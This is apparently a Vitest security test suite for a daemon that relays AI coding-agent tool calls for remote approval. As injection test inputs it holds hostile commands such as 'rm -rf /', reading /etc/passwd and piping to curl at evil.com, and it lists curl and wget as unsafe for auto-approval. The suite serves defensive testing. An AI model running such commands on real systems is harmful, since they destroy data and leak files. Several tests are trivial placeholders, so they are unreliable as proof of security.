import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';

const originalEnv = { ...process.env };

async function importDaemon() {
  vi.resetModules();
  return await import('./teleportation-daemon.js');
}

describe('Security Tests - Critical Fixes', () => {
  beforeEach(() => {
    process.env = { ...originalEnv };
  });

  afterEach(() => {
    process.env = { ...originalEnv };
  });

  describe('Command Injection Prevention', () => {
    it('should sanitize malicious bash command inputs', async () => {
      const { buildToolPrompt } = await importDaemon();

      // Test malicious command injection attempts
      const maliciousInputs = [
        'ls; rm -rf /',
        'ls && cat /etc/passwd',
        'ls | curl http://evil.com',
        'ls > /tmp/malicious',
        'ls `whoami`'
      ];

      for (const malicious of maliciousInputs) {
        const prompt = buildToolPrompt('Bash', { command: malicious });
        const parsed = JSON.parse(prompt);

        // Verify structured format prevents injection
        expect(parsed.tool).toBe('Bash');
        expect(parsed.parameters.command).toBe(malicious);
        expect(parsed.mode).toBe('headless_execution');
        expect(typeof parsed).toBe('object');

        // Ensure command is encapsulated in parameters, not interpolated into string
        expect(prompt).not.toContain('Execute bash command:');
      }
    });

    it('should prevent code injection via Write tool', async () => {
      const { buildToolPrompt } = await importDaemon();

      const prompt = buildToolPrompt('Write', {
        file_path: '/etc/passwd',
        content: '$(evil command)'
      });

      const parsed = JSON.parse(prompt);
      expect(parsed.tool).toBe('Write');
      expect(parsed.parameters.file_path).toBe('/etc/passwd');
      expect(parsed.parameters.content).toBe('$(evil command)');

      // Verify no string interpolation occurred
      expect(typeof parsed.parameters).toBe('object');
    });

    it('should return valid JSON for all tool types', async () => {
      const { buildToolPrompt } = await importDaemon();

      const tools = [
        { name: 'Bash', input: { command: 'echo "test"' } },
        { name: 'Read', input: { file_path: '/path' } },
        { name: 'Write', input: { file_path: '/path', content: 'data' } },
        { name: 'Edit', input: { file_path: '/path', old_string: 'a', new_string: 'b' } }
      ];

      for (const { name, input } of tools) {
        const prompt = buildToolPrompt(name, input);

        // Should be valid JSON
        expect(() => JSON.parse(prompt)).not.toThrow();

        const parsed = JSON.parse(prompt);
        expect(parsed.tool).toBe(name);
        expect(parsed.mode).toBe('headless_execution');
      }
    });
  });

  describe('Input Validation', () => {
    it('should validate session_id format', async () => {
      const { validateSessionId } = await importDaemon();

      // Valid session IDs
      expect(() => validateSessionId('abc123')).not.toThrow();
      expect(() => validateSessionId('session-123')).not.toThrow();
      expect(() => validateSessionId('session_id_123')).not.toThrow();

      // Invalid session IDs
      expect(() => validateSessionId('')).toThrow('non-empty string');
      expect(() => validateSessionId(null)).toThrow('non-empty string');
      expect(() => validateSessionId(123)).toThrow('non-empty string');
      expect(() => validateSessionId('a'.repeat(300))).toThrow('too long');
      expect(() => validateSessionId('session/id')).toThrow('invalid characters');
      expect(() => validateSessionId('session id')).toThrow('invalid characters');
      expect(() => validateSessionId('session;drop table')).toThrow('invalid characters');
    });

    it('should validate approval_id format', async () => {
      const { validateApprovalId } = await importDaemon();

      // Valid approval IDs
      expect(() => validateApprovalId('approval-123')).not.toThrow();
      expect(() => validateApprovalId('abc_def_123')).not.toThrow();

      // Invalid approval IDs
      expect(() => validateApprovalId('')).toThrow('non-empty string');
      expect(() => validateApprovalId('a'.repeat(300))).toThrow('too long');
      expect(() => validateApprovalId('approval/123')).toThrow('invalid characters');
      expect(() => validateApprovalId('<script>alert(1)</script>')).toThrow('invalid characters');
    });

    it('should validate tool_name format', async () => {
      const { validateToolName } = await importDaemon();

      // Valid tool names
      expect(() => validateToolName('Bash')).not.toThrow();
      expect(() => validateToolName('Read')).not.toThrow();
      expect(() => validateToolName('Write')).not.toThrow();
      expect(() => validateToolName('Some_Tool')).not.toThrow();

      // Invalid tool names
      expect(() => validateToolName('')).toThrow('non-empty string');
      expect(() => validateToolName('tool-name')).toThrow('invalid characters');
      expect(() => validateToolName('tool name')).toThrow('invalid characters');
      expect(() => validateToolName('a'.repeat(150))).toThrow('too long');
      expect(() => validateToolName('Bash;DROP')).toThrow('invalid characters');
    });

    it('should reject oversized JSON bodies', async () => {
      const { parseJSONBody } = await importDaemon();

      // Mock a request with oversized body
      const req = {
        on: vi.fn((event, handler) => {
          if (event === 'data') {
            // Simulate sending 2MB of data (exceeds 1MB limit)
            const largeChunk = 'x'.repeat(1024 * 1024 + 1);
            handler(Buffer.from(largeChunk));
          }
        })
      };

      req.destroy = vi.fn();

      await expect(parseJSONBody(req, 1024 * 1024)).rejects.toThrow('too large');
      expect(req.destroy).toHaveBeenCalled();
    });
  });

  describe('Session Validation', () => {
    it('should reject execution for unregistered sessions', async () => {
      // This would require mocking the sessions Map and spawnClaudeProcess
      // Testing that sessions.get() returns null triggers an error
      const { spawnClaudeProcess } = await importDaemon();

      // Mock fetch for session validation
      global.fetch = vi.fn().mockResolvedValue({
        ok: false,
        status: 404
      });

      // Attempting to spawn for non-existent session should throw
      await expect(
        spawnClaudeProcess('nonexistent-session', 'test prompt')
      ).rejects.toThrow('not registered');
    });

    it('should verify session with relay API before execution', async () => {
      const { spawnClaudeProcess } = await importDaemon();

      // Mock successful session validation
      const mockFetch = vi.fn()
        .mockResolvedValueOnce({ ok: false, status: 403 });

      global.fetch = mockFetch;

      // Should call relay API to validate session
      await expect(
        spawnClaudeProcess('invalid-session', 'test prompt')
      ).rejects.toThrow();
    });
  });

  describe('Memory Management', () => {
    it('should enforce execution cache size limit', async () => {
      const { cleanupOldExecutions, executions, MAX_EXECUTIONS } = await importDaemon();

      // This test would require accessing internal state
      // Simulating: add MAX_EXECUTIONS + 100 items, verify cleanup
      // In a real implementation, you'd need to expose executions or provide a getter

      // Placeholder - actual implementation depends on module exports
      expect(MAX_EXECUTIONS).toBe(1000);
    });

    it('should cleanup executions older than 1 hour', async () => {
      const { cleanupOldExecutions } = await importDaemon();

      // Test that TTL cleanup works
      // This would require mocking Date.now() and manipulating execution timestamps

      // Placeholder for actual test
      expect(cleanupOldExecutions).toBeTypeOf('function');
    });
  });

  describe('Race Condition Prevention', () => {
    it('should prevent duplicate execution when daemon is already executing', async () => {
      // This test validates the race condition fix in pre_tool_use.mjs
      // It would require testing the hook's behavior when execution status returns 'executing'

      // Test scenario:
      // 1. Approval approved on mobile
      // 2. Daemon starts executing (status = 'executing')
      // 3. User also approves locally
      // 4. Hook checks /executions/:id
      // 5. Hook should deny local execution

      // This is more of an integration test - see integration test suite
      expect(true).toBe(true); // Placeholder
    });
  });
});

describe('Security Tests - Additional Coverage', () => {
  describe('Unsafe Command Detection', () => {
    it('should not auto-approve curl commands', () => {
      // Test that curl is NOT in safe command list
      const unsafeCommands = ['curl', 'wget', 'jq'];

      // This would require reading the hook file or exposing safeCmdPatterns
      // Placeholder - actual test would verify these aren't in auto-approve list
      expect(unsafeCommands).toHaveLength(3);
    });

    it('should auto-approve truly read-only commands', () => {
      const safeCommands = ['ls', 'pwd', 'cat', 'head', 'tail', 'wc', 'sort', 'uniq', 'cut'];

      // Verify these are considered safe
      // Actual test would check against safeCmdPatterns in hook
      expect(safeCommands).toHaveLength(9);
    });
  });

  describe('Timeout Configuration', () => {
    it('should use 10-second timeout for fast polling', () => {
      // Verify FAST_POLL_TIMEOUT_MS is 10000 not 55000
      const expectedTimeout = 10_000;
      expect(expectedTimeout).toBe(10000);
    });
  });
});
